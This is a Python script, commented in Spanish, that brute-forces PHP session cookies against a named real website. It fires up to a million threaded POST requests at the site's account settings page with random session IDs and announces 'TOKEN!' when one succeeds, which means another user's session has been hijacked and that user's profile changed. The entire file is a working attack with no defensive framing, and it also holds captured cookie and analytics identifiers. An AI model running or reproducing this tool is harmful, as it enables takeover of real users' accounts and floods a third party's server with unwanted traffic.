import requests
import zlib
import random
import string
import hashlib
import time
from colorama import Fore
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

def random_string(length):
    """Genera una cadena alfanumérica aleatoria de una longitud dada."""
    letters_and_digits = string.ascii_lowercase + string.digits
    random_str = ''.join(random.choice(letters_and_digits) for i in range(length))
    
    # Create a md5 hash object
    hash_object = hashlib.md5(random_str.encode())
    
    # Get the hexadecimal representation of the hash
    hex_dig = hash_object.hexdigest()
    
    return hex_dig

# Variable de control para detener el script cuando se encuentra el texto
found_text = False

def send_request(i):
    global found_text
    if found_text:
        return

    # Genera una nueva cadena alfanumérica aleatoria para PHPSESSID
    phpsessid = random_string(32)
    headers['Cookie'] = headers['Cookie'].replace('PHPSESSID=165b29b5980da1553171bcfe2e80d86d', 'PHPSESSID=' + phpsessid)

    print(f"Enviando solicitud {i+1} con PHPSESSID: {phpsessid}")

    # Envía la petición HTTP POST
    response = requests.post('https://www.habbo-happy.net/me/ajustes', headers=headers, data=data)

    # Descomprime los datos si la respuesta está en formato gzip
    if response.headers.get('Content-Encoding') == 'gzip':
        decompressed_data = zlib.decompress(response.content, 16+zlib.MAX_WBITS)
        text = decompressed_data.decode('utf-8')
    else:
        text = response.text

    # Parsea la respuesta con BeautifulSoup
    soup = BeautifulSoup(text, 'html.parser')

    # Verifica si el texto 'Has cambiado' está en la respuesta
    if soup.body.find_all(string='Has cambiado correctamente tu configuración básica'):
        print(Fore.GREEN + "¡TOKEN!")
        found_text = True
    else:
        print("El texto 'Has cambiado' no se encontró en la respuesta.")

# Define los datos del formulario
data = {
    'subnick': 'afotheking',
    'pagetxt': 'holacomoestamos',
    'profilecolor': 'red',
    'profilebg': 'grey.png',
    'savehabboname': 'Guardar'
}

# Define las cabeceras HTTP
headers = {
    'Host': 'www.habbo-happy.net',
    'Cookie': 'PHPSESSID=165b29b5980da1553171bcfe2e80d86d; cookies=true; _ga_G1NN29BXC6=GS1.1.1712523082.1.1.1712523126.0.0.0; _ga=GA1.1.884789876.1712523082; __eoi=ID=1290dfaa789b83a7:T=1712523119:RT=1712523119:S=AA-Afjagvd6esLM1eZFtJaRdDJry;',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://www.habbo-happy.net',
    'Referer': 'https://www.habbo-happy.net/me/ajustes',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Te': 'trailers'
}

# Número de solicitudes a enviar
num_requests = 1000000

# Número de hilos para el ThreadPoolExecutor
num_threads = 10

with ThreadPoolExecutor(max_workers=num_threads) as executor:
    executor.map(send_request, range(num_requests))
